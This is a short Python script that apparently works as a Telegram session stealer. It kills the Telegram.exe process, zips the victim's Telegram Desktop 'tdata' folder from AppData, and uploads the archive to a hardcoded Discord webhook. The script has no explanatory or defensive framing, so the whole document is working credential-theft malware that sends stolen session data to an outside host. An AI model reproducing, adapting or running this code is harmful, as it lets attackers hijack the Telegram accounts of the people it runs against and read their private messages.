import zipfile
import os
import requests
import psutil

def kill_app(process_name):
    for process in psutil.process_iter():
        if process.name() == process_name:
            process.kill()
            print(f"{process_name} successfully killed.")
            return
    print(f"{process_name} not found.")

kill_app("Telegram.exe")

discord_webhook_url = "https://discord.com/api/webhooks/1113092539931693136/_hqR3AE23ne9nRjdbfQpgDFbRN9lMKlR8ZvawMBgxeKlaMnaglhhViuWmKfXEtWRYqS3"

directory = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Telegram Desktop\\tdata"
exclude_folder = "user_data"

zip_filename = "d:/telegram logger.zip"

with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zip:
    for root, dirs, files in os.walk(directory):
        if exclude_folder in dirs:
            dirs.remove(exclude_folder)

        for file in files:
            file_path = os.path.join(root, file)
            zip.write(file_path)

        for dir in dirs:
            dir_path = os.path.join(root, dir)
            zip.write(dir_path)

with open(zip_filename, "rb") as f:
    file_content = f.read()
zip_file_name = os.path.basename(zip_filename)

files = {
    "file": (zip_file_name, file_content, "application/zip")
}
response = requests.post(discord_webhook_url, files=files)

if response.status_code == 200:
    print("file was send to discord")
else:
    print(f"{response.status_code} error")

print("end point")